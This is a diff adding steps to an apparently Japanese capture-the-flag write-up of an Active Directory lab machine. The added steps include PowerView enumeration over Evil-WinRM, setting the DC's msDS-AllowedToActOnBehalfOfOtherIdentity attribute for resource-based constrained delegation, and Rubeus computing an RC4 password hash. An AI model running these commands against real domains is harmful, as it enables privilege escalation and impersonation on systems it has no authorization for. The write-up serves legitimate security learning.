@@ -2,6 +2,14 @@ Shared Support Accountsというグループのメンバは、コンピュータ
 
 ![alltodc](https://user-images.githubusercontent.com/85237728/194805252-d9fdfd2a-b0eb-41cf-956a-2cd91852b170.png)
 
+```
+*Evil-WinRM* PS C:\Users\support> Get-DomainController | select name
+
+Name
+----
+dc.support.htb
+```
+
 このGeneric Allとはフルコントロールを意味する。
 
 コンピュータオブジェクトをフルコントロールできる時、resource based constrained delegationアタックという攻撃手法がある。
@@ -58,7 +66,49 @@ BinaryLength           : 80
 *Evil-WinRM* PS C:\Users\support> $SD.GetBinaryForm($SDBytes, 0)
 ```
 
+[Security Descriptor, DACL, ACEについて](https://tech.blog.aerie.jp/entry/2017/12/19/104346)
+
+作成したこのセキュリティ記述子（Security Descriptor）を、ターゲットであるコンピュータアカウントdcの「msDS-AllowedToActOnBehalfOfOtherIdentity」という属性に設定する：
+
+```
+dc.support.htb
+*Evil-WinRM* PS C:\Users\support> Get-DomainComputer | select name
+
+name
+----
+DC
+MANAGEMENT
+attackersystem
+
+# 属性がセットされていないことを確認
+*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | select name,msds-allowedtoactonbehalfofotheridentit
+
+name msds-allowedtoactonbehalfofotheridentit
+---- ---------------------------------------
+DC
+
+*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+最初に作成したコンピュータアカウントattackersystemのパスワードのRC4_HMAC形式を得るために[Rubeus.exe](https://github.com/GhostPack/Rubeus)を使う。
+
+（Rubeus.exeのバイナリは[ここ](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)から）
+
+```
+*Evil-WinRM* PS C:\Users\support> .\Rubeus.exe hash /password:Summer2018!
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
 
 
+[*] Action: Calculate Password Hash(es)
 
-
+[*] Input password             : Summer2018!
+[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F
+```
